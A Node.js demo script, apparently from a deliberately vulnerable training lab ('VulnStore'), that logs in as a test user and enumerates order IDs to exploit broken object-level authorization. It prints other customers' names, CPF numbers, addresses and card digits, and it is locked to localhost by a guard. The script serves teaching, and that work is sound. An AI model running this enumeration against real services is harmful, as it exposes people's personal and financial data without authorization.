/**
 * Demo de BOLA em escala: faz login como João e percorre IDs de pedidos.
 * Uso:  node scripts/enum-orders.js [baseUrl] [idInicial] [idFinal]
 *   ex: node scripts/enum-orders.js http://127.0.0.1:3000 1000 1010
 * Somente para o laboratório local da VulnStore.
 */
const base = process.argv[2] || 'http://127.0.0.1:3000';
const from = Number(process.argv[3] || 1000);
const to = Number(process.argv[4] || 1010);
if (!/^http:\/\/(127\.0\.0\.1|localhost)(:\d+)?$/.test(base)) {
  console.error('Este script só roda contra o laboratório local.'); process.exit(1);
}
(async () => {
  const login = await fetch(base + '/api/auth/login', {
    method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email: 'joao@vulnstore.test', password: 'joao123' }),
  }).then((r) => r.json());
  if (!login.token) { console.error('Falha no login:', login); process.exit(1); }
  console.log(`[*] Logado como João (id ${login.user.id}). Percorrendo pedidos ${from}..${to}\n`);
  for (let id = from; id <= to; id++) {
    const r = await fetch(`${base}/api/orders/${id}`, { headers: { Authorization: 'Bearer ' + login.token } });
    const body = await r.json();
    if (r.status === 200) {
      const dono = body.customer ? `${body.customer.name} | CPF ${body.customer.cpf}` : `userId ${body.userId}`;
      console.log(`    #${id} -> 200  ${dono} | ${body.shippingAddress} | cartão final ${body.cardLast4}`);
    } else {
      console.log(`    #${id} -> ${r.status}`);
    }
  }
})();
